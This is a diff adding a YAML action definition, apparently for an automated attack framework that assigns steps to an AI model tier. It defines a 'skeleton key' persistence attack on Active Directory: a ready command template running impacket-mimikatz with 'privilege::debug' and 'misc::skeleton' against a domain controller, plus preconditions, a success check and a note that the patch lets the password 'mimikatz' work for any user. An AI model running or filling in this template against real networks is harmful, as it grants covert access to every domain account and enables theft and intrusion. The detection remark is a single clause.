@@ -1,0 +1,17 @@
+name: skeleton_key
+category: ad
+description: Skeleton key injection into DC LSASS
+preconditions:
+  - domain_joined
+  - has_cred
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "impacket-mimikatz -dc-ip {target_ip} '{domain}/{username}:{password}' 'privilege::debug' 'misc::skeleton'"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Patches LSASS on DC to accept master password ('mimikatz') for any user. Survives until DC reboot. Detection: monitor for LSASS patching."
